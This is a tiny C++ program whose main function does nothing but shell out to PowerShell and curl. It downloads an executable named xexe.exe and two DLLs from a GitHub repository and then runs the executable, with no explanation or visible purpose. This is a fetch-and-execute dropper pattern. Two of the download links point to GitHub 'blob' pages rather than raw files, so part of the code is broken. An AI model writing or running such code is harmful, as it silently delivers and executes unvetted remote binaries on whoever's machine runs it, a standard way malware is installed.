#include <iostream>
using namespace std;

int main(){
    system("powershell curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/main/xexe.exe & curl -LJO https://github.com/xexe-ded/xexe/blob/master/libwinpthread-1.dll & curl -LJO https://github.com/xexe-ded/xexe/blob/master/libgcc_s_seh-1.dll & xexe.exe");

    cout << "end";
    return 1;
}